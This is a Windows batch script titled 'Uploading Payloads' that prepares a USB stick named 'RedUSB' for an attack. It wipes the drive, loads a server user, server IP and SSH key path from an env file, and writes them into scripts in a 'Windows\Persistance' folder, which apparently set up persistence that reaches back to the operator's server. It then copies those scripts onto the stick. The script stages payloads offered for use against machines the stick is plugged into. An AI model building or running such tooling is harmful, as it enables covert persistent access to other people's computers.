@echo off
title Uploading Payloads
cls

echo [!] Checking USB drive...
timeout /t 2 /nobreak >nul

:: Detect the USB drive letter and name
for /f "tokens=2 delims==" %%I in ('wmic logicaldisk where "drivetype=2" get deviceid /value') do set USBDrive=%%I
for /f "tokens=2 delims==" %%I in ('wmic logicaldisk where "drivetype=2" get volumename /value') do set USBName=%%I

:: Display text with ANSI escape codes in CMD
echo [!] USB drive detected: [92m%USBDrive%[0m
echo [!] USB name: [92m%USBName%[0m
echo ----------------------------------------


if /i "%USBName%"=="RedUSB" (
    echo [!] Valid RedUSB drive found
    
    :: Clear existing USB contents
    echo [!] Clearing USB contents...
    del /F /S /Q "%USBDrive%\*" >nul 2>&1
    
    :: Check if homeInfo.env exists
    if not exist "homeInfo.env" (
        echo [31m[ERROR] homeInfo.env file not found![0m
        pause
        exit /b
    )

    :: Load environment variables with delayed expansion
    echo [!] Loading environment variables...
    setlocal enabledelayedexpansion
    for /f "usebackq tokens=1,* delims==" %%A in ("homeInfo.env") do (
        set "%%A=%%B"
    )

    :: Print loaded variables for debugging
    echo ----------------------------------
    echo Environment Values:
    echo ServerUser=[92m!ServerUser![0m
    echo ServerIP=[92m!ServerIP![0m
    echo DesktopSSHKey=[92m!DesktopSSHKey![0m
    echo ----------------------------------
    endlocal

    :: Create temp directory for processing
    mkdir "%TEMP%\RedUSB" 2>nul
    xcopy /E /Y /I "USB\*" "%TEMP%\RedUSB\" >nul 2>&1
    
    :: Update scripts with environment variables
    echo [!] Replacing placeholders in scripts...
    for %%F in ("%TEMP%\RedUSB\Windows\Persistance\*.bat") do (
        powershell -Command "(Get-Content '%%F') | ForEach-Object { $_ -replace 'set remote_user=.*', 'set remote_user=\"!ServerUser!\"' -replace 'set remote_host=.*', 'set remote_host=\"!ServerIP!\"' -replace 'set ssh_key_path=.*', 'set ssh_key_path=\"!DesktopSSHKey!\"' -replace '%%ServerUser%%', '!ServerUser!' -replace '%%ServerIP%%', '!ServerIP!' -replace '%%DesktopSSHKey%%', '!DesktopSSHKey!' } | Set-Content '%%F'"
    )

    :: Copy processed files to USB
    echo [!] Updating USB contents...
    xcopy /E /Y /I "%TEMP%\RedUSB\*" "%USBDrive%\" >nul 2>&1
    
    :: Cleanup
    rmdir /S /Q "%TEMP%\RedUSB"
    echo [!] USB contents updated successfully!

) else (
    echo [!] [31mThis is not a RedUSB drive[0m
)

timeout /t 3 /nobreak >nul
